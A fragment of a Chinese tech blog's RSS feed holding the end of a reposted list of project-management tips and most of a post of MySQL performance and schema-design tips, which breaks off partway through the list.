&lt;p&gt;&lt;img src=&#34;/img/2024/643.png&#34; alt=&#34;erik.xyz&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/img/2024/644.png&#34; alt=&#34;erik.xyz&#34;&gt;&lt;/p&gt;
&lt;p&gt;互联网项目管理的17条经验沟通是王道 &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;不论技术多么先进，没有良好的沟通机制，项目都会遇到瓶颈。确保团队成员之间有开放的沟通渠道，并且每个人都清楚自己的职责和项目的整体目标。优先级高于一切 &lt;/li&gt;
&lt;li&gt;学会区分哪些功能是必须的，哪些可以稍后添加。优先处理那些对用户来说最重要的功能。短周期发布 &lt;/li&gt;
&lt;li&gt;通过缩短发布周期，可以更快地得到用户反馈，并及时调整方向，减少资源浪费。用户反馈是金 - 始终保持与用户的联系，收集他们的反馈，并快速做出响应。这有助于产品不断改进。简化就是美 &lt;/li&gt;
&lt;li&gt;尽量简化产品的设计和功能，避免不必要的复杂性。简单易用的产品往往更受欢迎。质量控制不可忽视 &lt;/li&gt;
&lt;li&gt;在项目的每个阶段都要进行质量检查，防止小问题积累成大问题。风险管理要提前 - 对潜在的风险进行评估，并制定相应的应对策略，这样可以在问题发生前就解决它们。灵活调整计划 &lt;/li&gt;
&lt;li&gt;计划永远赶不上变化，学会在项目过程中根据实际情况调整计划是非常重要的。团队建设很重要 &lt;/li&gt;
&lt;li&gt;投资于团队建设活动，增强团队凝聚力，提高工作效率。技术选型要谨慎 &lt;/li&gt;
&lt;li&gt;在选择技术栈时要考虑长远发展，而不是仅仅因为某项技术当前流行。数据驱动决策 &lt;/li&gt;
&lt;li&gt;使用数据分析来支持产品决策，而不是仅凭直觉。重视用户体验 &lt;/li&gt;
&lt;li&gt;用户体验应该贯穿整个产品生命周期，从设计到开发再到测试，都要考虑到用户体验。持续学习与适应 &lt;/li&gt;
&lt;li&gt;技术和市场都在不断变化，持续学习新的知识和技术是必要的。文档化重要信息 &lt;/li&gt;
&lt;li&gt;确保所有的关键决策和信息都有记录，这对于新加入的团队成员来说尤其重要。健康的工作生活平衡 - 鼓励团队成员保持良好的工作生活平衡，过度劳累只会降低生产力和创新能力。持续集成/持续部署（CI/CD） &lt;/li&gt;
&lt;li&gt;实施CI/CD流程，不仅提高了代码的质量，也加速了软件的发布周期。透明度提升信任 &lt;/li&gt;
&lt;li&gt;保持项目进展的透明，定期向所有相关方汇报进度，这样可以建立信任并减少误解。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;转载自：&lt;a href=&#34;https://mp.weixin.qq.com/s/kv0BAmE6ASll9eZjvlZImQ&#34;&gt;PMO前沿&lt;/a&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://erik.xyz/2024/07/22/sql-performance-optimization/</guid>
            <title>SQL性能优化的47个小技巧，果断收藏！</title>
            <link>https://erik.xyz/2024/07/22/sql-performance-optimization/</link>
            <category>mysql</category>
            <category>sql</category>
            <category>sql优化</category>
            <pubDate>Mon, 22 Jul 2024 12:44:34 +0800</pubDate>
            <description><![CDATA[ &lt;link rel=&#34;stylesheet&#34; class=&#34;aplayer-secondary-style-marker&#34; href=&#34;/assets/css/APlayer.min.css&#34;&gt;&lt;script src=&#34;/assets/js/APlayer.min.js&#34; class=&#34;aplayer-secondary-script-marker&#34;&gt;&lt;/script&gt;&lt;p&gt;&lt;strong&gt;1、先了解MySQL的执行过程&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;了解了MySQL的执行过程，我们才知道如何进行sql优化。&lt;/p&gt;
&lt;p&gt;1.客户端发送一条查询语句到服务器；&lt;/p&gt;
&lt;p&gt;2.服务器先查询缓存，如果命中缓存，则立即返回存储在缓存中的数据；&lt;/p&gt;
&lt;p&gt;3.未命中缓存后，MySQL通过关键字将SQL语句进行解析，并生成一颗对应的解析树，MySQL解析器将使用MySQL语法进行验证和解析。例如，验证是否使用了错误的关键字，或者关键字的使用是否正确；&lt;/p&gt;
&lt;p&gt;4.预处理是根据一些MySQL规则检查解析树是否合理，比如检查表和列是否存在，还会解析名字和别名，然后预处理器会验证权限；&lt;/p&gt;
&lt;p&gt;5.根据执行计划查询执行引擎，调用API接口调用存储引擎来查询数据；&lt;/p&gt;
&lt;p&gt;6.将结果返回客户端，并进行缓存；&lt;br&gt;&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/img/2024/202405201.png&#34; alt=&#34;erik.xyz&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2、数据库常见规范&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1.所有数据库对象名称必须使用小写字母并用下划线分割；&lt;/p&gt;
&lt;p&gt;2.所有数据库对象名称禁止使用mysql保留关键字；&lt;/p&gt;
&lt;p&gt;3.数据库对象的命名要能做到见名识意，并且最后不要超过32个字符；&lt;/p&gt;
&lt;p&gt;4.临时库表必须以tmp&lt;em&gt;为前缀并以日期为后缀，备份表必须以bak&lt;/em&gt;为前缀并以日期(时间戳)为后缀；&lt;/p&gt;
&lt;p&gt;5.所有存储相同数据的列名和列类型必须一致；&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;3、所有表必须使用Innodb存储引擎&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;没有特殊要求（即Innodb无法满足的功能如：列存储，存储空间数据等）的情况下，所有表必须使用Innodb存储引擎（mysql5.5之前默认使用Myisam，5.6以后默认的为Innodb）。&lt;/p&gt;
&lt;p&gt;Innodb 支持事务，支持行级锁，更好的恢复性，高并发下性能更好。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;4、每个Innodb表必须有个主键&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Innodb是一种索引组织表：数据的存储的逻辑顺序和索引的顺序是相同的。每个表都可以有多个索引，但是表的存储顺序只能有一种。&lt;/p&gt;
&lt;p&gt;Innodb是按照主键索引的顺序来组织表的&lt;/p&gt;
&lt;p&gt;1.不要使用更新频繁的列作为主键，不适用多列主键；&lt;/p&gt;
&lt;p&gt;2.不要使用UUID、MD5、HASH、字符串列作为主键（无法保证数据的顺序增长）；&lt;/p&gt;
&lt;p&gt;3.主键建议使用自增ID值；&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;5、数据库和表的字符集统一使用UTF8&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;兼容性更好，统一字符集可以避免由于字符集转换产生的乱码，不同的字符集进行比较前需要进行转换会造成索引失效，如果数据库中有存储emoji表情的需要，字符集需要采用utf8mb4字符集。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;6、查询SQL尽量不要使用select *，而是具体字段&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;select *的弊端：&lt;/p&gt;
&lt;p&gt;1.增加很多不必要的消耗，比如CPU、IO、内存、网络带宽；&lt;/p&gt;
&lt;p&gt;2.增加了使用覆盖索引的可能性；&lt;/p&gt;
&lt;p&gt;3.增加了回表的可能性；&lt;/p&gt;
&lt;p&gt;4.当表结构发生变化时，前端也需要更改；&lt;/p&gt;
&lt;p&gt;5.查询效率低；&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;7、避免在where子句中使用 or 来连接条件&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1.使用or可能会使索引失效，从而全表扫描；&lt;/p&gt;
&lt;p&gt;2.对于or没有索引的salary这种情况，假设它走了id的索引，但是走到salary查询条件时，它还得全表扫描；&lt;/p&gt;
&lt;p&gt;3.也就是说整个过程需要三步：全表扫描+索引扫描+合并。如果它一开始就走全表扫描，直接一遍扫描就搞定；&lt;/p&gt;
&lt;p&gt;4.虽然mysql是有优化器的，处于效率与成本考虑，遇到or条件，索引还是可能失效的；&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;8、尽量使用数值替代字符串类型&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1.因为引擎在处理查询和连接时会逐个比较字符串中每一个字符；&lt;/p&gt;
&lt;p&gt;2.而对于数字型而言只需要比较一次就够了；&lt;/p&gt;
&lt;p&gt;3.字符会降低查询和连接的性能，并会增加存储开销；&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;9、使用varchar代替char&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1.varchar变长字段按数据内容实际长度存储，存储空间小，可以节省存储空间；&lt;/p&gt;
&lt;p&gt;2.char按声明大小存储，不足补空格；&lt;/p&gt;
&lt;p&gt;3.其次对于查询来说，在一个相对较小的字段内搜索，效率更高；&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;10、财务、银行相关的金额字段必须使用decimal类型&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;非精准浮点：float,double&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;精准浮点：decimal&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;1.Decimal类型为精准浮点数，在计算时不会丢失精度；&lt;/p&gt;
&lt;p&gt;2.占用空间由定义的宽度决定，每4个字节可以存储9位数字，并且小数点要占用一个字节；&lt;/p&gt;
&lt;p&gt;3.可用于存储比bigint更大的整型数据；&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;11、避免使用ENUM类型&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;修改ENUM值需要使用ALTER语句；&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;ENUM类型的ORDER BY操作效率低，需要额外操作；&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;禁止使用数值作为ENUM的枚举值；&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;12、去重distinct过滤字段要少&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1.带distinct的语句占用cpu时间高于不带distinct的语句&lt;/p&gt;
&lt;p&gt;2.当查询很多字段时，如果使用distinct，数据库引擎就会对数据进行比较，过滤掉重复数据&lt;/p&gt;
&lt;p&gt;3.然而这个比较、过滤的过程会占用系统资源，如cpu时间&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;13、where中使用默认值代替null&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1.并不是说使用了is null或者 is not null就会不走索引了，这个跟mysql版本以及查询成本都有关；&lt;/p&gt;
&lt;p&gt;2.如果mysql优化器发现，走索引比不走索引成本还要高，就会放弃索引，这些条件 !=，&amp;lt;&amp;gt;，is null，is not null经常被认为让索引失效；&lt;/p&gt;
&lt;p&gt;3.其实是因为一般情况下，查询的成本高，优化器自动放弃索引的；&lt;/p&gt;
&lt;p&gt;4.如果把null值，换成默认值，很多时候让走索引成为可能，同时，表达意思也相对清晰一点；&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;14、避免在where子句中使用!=或&amp;lt;&amp;gt;操作符&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1.使用!=和&amp;lt;&amp;gt;很可能会让索引失效&lt;/p&gt;
&lt;p&gt;2.应尽量避免在where子句中使用!=或&amp;lt;&amp;gt;操作符，否则引擎将放弃使用索引而进行全表扫描实&lt;/p&gt;
&lt;p&gt;3.现业务优先，实在没办法，就只能使用，并不是不能使用&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;15、inner join 、left join、right join，优先使用inner join&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;三种连接如果结果相同，优先使用inner join，如果使用left join左边表尽量小。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;inner join 内连接，只保留两张表中完全匹配的结果集；&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;left join会返回左表所有的行，即使在右表中没有匹配的记录；&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;right join会返回右表所有的行，即使在左表中没有匹配的记录；&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;为什么？&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;如果inner join是等值连接，返回的行数比较少，所以性能相对会好一点；&lt;/li&gt;
&lt;li&gt;使用了左连接，左边表数据结果尽量小，条件尽量放到左边处理，意味着返回的行数可能比较少；&lt;/li&gt;
&lt;li&gt;这是mysql优化原则，就是小表驱动大表，小的数据集驱动大的数据集，从而让性能更优；&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;16、提高group by语句的效率&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1、反例&lt;/p&gt;
&lt;p&gt;先分组，再过滤&lt;br&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;select job, avg（salary） from employee group by jobhaving job =&amp;#x27;develop&amp;#x27; or job = &amp;#x27;test&amp;#x27;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;2、正例&lt;/p&gt;
&lt;p&gt;先过滤，后分组&lt;br&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;select job，avg（salary） from employee where job =&amp;#x27;develop&amp;#x27; or job = &amp;#x27;test&amp;#x27; group by job;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;3、理由&lt;/p&gt;
&lt;p&gt;可以在执行到该语句前，把不需要的记录过滤掉&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;17、清空表时优先使用truncate&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;truncate table在功能上与不带 where子句的 delete语句相同：二者均删除表中的全部行。但 truncate table比 delete速度快，且使用的系统和事务日志资源少。&lt;/p&gt;
&lt;p&gt;delete语句每次删除一行，并在事务日志中为所删除的每行记录一项。truncate table通过释放存储表数据所用的数据页来删除数据，并且只在事务日志中记录页的释放。&lt;/p&gt;
&lt;p&gt;truncate table删除表中的所有行，但表结构及其列、约束、索引等保持不变。新行标识所用的计数值重置为该列的种子。如果想保留标识计数值，请改用 DELETE。如果要删除表定义及其数据，请使用 drop table语句。&lt;/p&gt;
&lt;p&gt;对于由 foreign key约束引用的表，不能使用 truncate table，而应使用不带  where子句的 DELETE 语句。由于 truncate table不记录在日志中，所以它不能激活触发器。&lt;/p&gt;
&lt;p&gt;truncate table不能用于参与了索引视图的表。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;18、操作delete或者update语句，加个limit或者循环分批次删除&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;（1）降低写错SQL的代价&lt;/p&gt;
&lt;p&gt;清空表数据可不是小事情，一个手抖全没了，删库跑路？如果加limit，删错也只是丢失部分数据，可以通过binlog日志快速恢复的。&lt;/p&gt;
&lt;p&gt;（2）SQL效率很可能更高&lt;/p&gt;
&lt;p&gt;SQL中加了limit 1，如果第一条就命中目标return， 没有limit的话，还会继续执行扫描表。&lt;/p&gt;
&lt;p&gt;（3）避免长事务&lt;/p&gt;
&lt;p&gt;delete执行时,如果age加了索引，MySQL会将所有相关的行加写锁和间隙锁，所有执行相关行会被锁住，如果删除数量大，会直接影响相关业务无法使用。&lt;/p&gt;
&lt;p&gt;（4）数据量大的话，容易把CPU打满&lt;/p&gt;
&lt;p&gt;如果你删除数据量很大时，不加 limit限制一下记录数，容易把cpu打满，导致越删越慢。&lt;/p&gt;
&lt;p&gt;（5）锁表&lt;/p&gt;
&lt;p&gt;一次性删除太多数据，可能造成锁表，会有lock wait timeout exceed的错误，所以建议分批操作。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;19、UNION操作符&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;UNION在进行表链接后会筛选掉重复的记录，所以在表链接后会对所产生的结果集进行排序运算，删除重复的记录再返回结果。实际大部分应用中是不会产生重复的记录，最常见的是过程表与历史表UNION。如：&lt;br&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;select username,tel from userunionselect departmentname from department&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br&gt;这个SQL在运行时先取出两个表的结果，再用排序空间进行排序删除重复的记录，最后返回结果集，如果表数据量大的话可能会导致用磁盘进行排序。推荐方案：采用UNION ALL操作符替代UNION，因为UNION ALL操作只是简单的将两个结果合并后就返回。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;20、SQL语句中IN包含的字段不宜过多&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;MySQL的IN中的常量全部存储在一个数组中，这个数组是排序的。如果值过多，产生的消耗也是比较大的。如果是连续的数字，可以使用between代替，或者使用连接查询替换。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;21、批量插入性能提升&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;（1）多条提交&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;INSERT INTO user (id,username) VALUES(1,&amp;#x27;哪吒编程&amp;#x27;);INSERT INTO user (id,username) VALUES(2,&amp;#x27;妲己&amp;#x27;);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;（2）批量提交&lt;br&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;INSERT INTO user (id,username) VALUES(1,&amp;#x27;哪吒编程&amp;#x27;),(2,&amp;#x27;妲己&amp;#x27;);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;默认新增SQL有事务控制，导致每条都需要事务开启和事务提交，而批量处理是一次事务开启和提交，效率提升明显，达到一定量级，效果显著，平时看不出来。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;22、表连接不宜太多，索引不宜太多，一般5个以内&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;（1）表连接不宜太多，一般5个以内&lt;/p&gt;
&lt;p&gt;1.关联的表个数越多，编译的时间和开销也就越大&lt;/p&gt;
&lt;p&gt;2.每次关联内存中都生成一个临时表&lt;/p&gt;
&lt;p&gt;3.应该把连接表拆开成较小的几个执行，可读性更高&lt;/p&gt;
&lt;p&gt;4.如果一定需要连接很多表才能得到数据，那么意味着这是个糟糕的设计了&lt;/p&gt;
&lt;p&gt;5.阿里规范中，建议多表联查三张表以下&lt;/p&gt;
&lt;p&gt;（2）索引不宜太多，一般5个以内&lt;/p&gt;
&lt;p&gt;1.索引并不是越多越好，虽其提高了查询的效率，但却会降低插入和更新的效率；&lt;/p&gt;
&lt;p&gt;2.索引可以理解为一个就是一张表，其可以存储数据，其数据就要占空间；&lt;/p&gt;
&lt;p&gt;3.索引表的数据是排序的，排序也是要花时间的；&lt;/p&gt;
&lt;p&gt;4.insert或update时有可能会重建索引，如果数据量巨大，重建将进行记录的重新排序，所以建索引需要慎重考虑，视具体情况来定；&lt;/p&gt;
&lt;p&gt;5.一个表的索引数最好不要超过5个，若太多需要考虑一些索引是否有存在的必要；&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;23、禁止给表中的每一列都建立单独的索引&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;真有这么干的，我也是醉了。&lt;/p&gt;
&lt;p&gt;2万字带你精通MySQL索引&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;24、如何选择索引列的顺序&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;建立索引的目的是：希望通过索引进行数据查找，减少随机IO，增加查询性能 ，索引能过滤出越少的数据，则从磁盘中读入的数据也就越少。&lt;/p&gt;
&lt;p&gt;区分度最高的放在联合索引的最左侧（区分度=列中不同值的数量/列的总行数）。&lt;/p&gt;
&lt;p&gt;尽量把字段长度小的列放在联合索引的最左侧（因为字段长度越小，一页能存储的数据量越大，IO性能也就越好）。&lt;/p&gt;
&lt;p&gt;使用最频繁的列放到联合索引的左侧（这样可以比较少的建立一些索引）。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;25、对于频繁的查询优先考虑使用覆盖索引&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;覆盖索引：就是包含了所有查询字段(where,select,ordery by,group by包含的字段)的索引。&lt;/p&gt;
&lt;p&gt;覆盖索引的好处：&lt;/p&gt;
&lt;p&gt;（1）避免Innodb表进行索引的二次查询&lt;/p&gt;
&lt;p&gt;Innodb是以聚集索引的顺序来存储的，对于Innodb来说，二级索引在叶子节点中所保存的是行的主键信息，如果是用二级索引查询数据的话，在查找到相应的键值后，还要通过主键进行二次查询才能获取我们真实所需要的数据。&lt;/p&gt;
&lt;p&gt;而在覆盖索引中，二级索引的键值中可以获取所有的数据，避免了对主键的二次查询 ，减少了IO操作，提升了查询效率。&lt;/p&gt;
&lt;p&gt;（2）可以把随机IO变成顺序IO加快查询效率&lt;/p&gt;
&lt;p&gt;由于覆盖索引是按键值的顺序存储的，对于IO密集型的范围查找来说，对比随机从磁盘读取每一行的数据IO要少的多，因此利用覆盖索引在访问时也可以把磁盘的随机读取的IO转变成索引查找的顺序IO。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;26、建议使用预编译语句进行数据库操作&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;预编译语句可以重复使用这些计划，减少SQL编译所需要的时间，还可以解决动态SQL所带来的SQL注入的问题。&lt;/p&gt;
&lt;p&gt;只传参数，比传递SQL语句更高效。&lt;/p&gt;
&lt;p&gt;相同语句可以一次解析，多次使用，提高处理效率。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;27、避免产生大事务操作&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;大批量修改数据，一定是在一个事务中进行的，这就会造成表中大批量数据进行锁定，从而导致大量的阻塞，阻塞会对MySQL的性能产生非常大的影响。&lt;/p&gt;
&lt;p&gt;特别是长时间的阻塞会占满所有数据库的可用连接，这会使生产环境中的其他应用无法连接到数据库，因此一定要注意大批量写操作要进行分批。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;28、避免在索引列上使用内置函数&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;使用索引列上内置函数，索引失效。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;29、组合索引&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;排序时应按照组合索引中各列的顺序进行排序，即使索引中只有一个列是要排序的，否则排序性能会比较差。&lt;br&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;create index IDX_USERNAME_TEL on user(deptid,position,createtime);select username,tel from user where deptid= 1 and position = &amp;#x27;java开发&amp;#x27; order by deptid,position,createtime desc; &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;实际上只是查询出符合 deptid= 1 and position = ‘java开发’条件的记录并按createtime降序排序，但写成order by createtime desc性能较差。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;30、复合索引最左特性&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;（1）创建复合索引&lt;br&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;ALTER TABLE employee ADD INDEX idx_name_salary (name,salary)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br&gt;（2）满足复合索引的最左特性，哪怕只是部分，复合索引生效&lt;br&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;SELECT * FROM employee WHERE NAME=&amp;#x27;哪吒编程&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br&gt;（3）没有出现左边的字段，则不满足最左特性，索引失效&lt;br&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;SELECT * FROM employee WHERE salary=5000&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br&gt;（4）复合索引全使用，按左侧顺序出现 name,salary，索引生效&lt;br&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;SELECT * FROM employee WHERE NAME=&amp;#x27;哪吒编程&amp;#x27; AND salary=5000&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br&gt;（5）虽然违背了最左特性，但MySQL执行SQL时会进行优化，底层进行颠倒优化&lt;br&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;SELECT * FROM employee WHERE salary=5000 AND NAME=&amp;#x27;哪吒编程&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br&gt;（6）理由&lt;br&gt;复合索引也称为联合索引，当我们创建一个联合索引的时候，如(k1,k2,k3)，相当于创建了（k1）、(k1,k2)和(k1,k2,k3)三个索引，这就是最左匹配原则。&lt;/p&gt;
&lt;p&gt;联合索引不满足最左原则，索引一般会失效。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;31、必要时可以使用force index来强制查询走某个索引&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;有的时候MySQL优化器采取它认为合适的索引来检索SQL语句，但是可能它所采用的索引并不是我们想要的。这时就可以采用forceindex来强制优化器使用我们制定的索引。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;32、优化like语句&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;模糊查询，程序员最喜欢的就是使用like，但是like很可能让你的索引失效。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;首先尽量避免模糊查询，如果必须使用，不采用全模糊查询，也应尽量采用右模糊查询， 即like ‘…%’，是会使用索引的；&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;左模糊like ‘%…’无法直接使用索引，但可以利用reverse + function index的形式，变化成 like ‘…%’；&lt;/p&gt;
&lt;/li&gt;
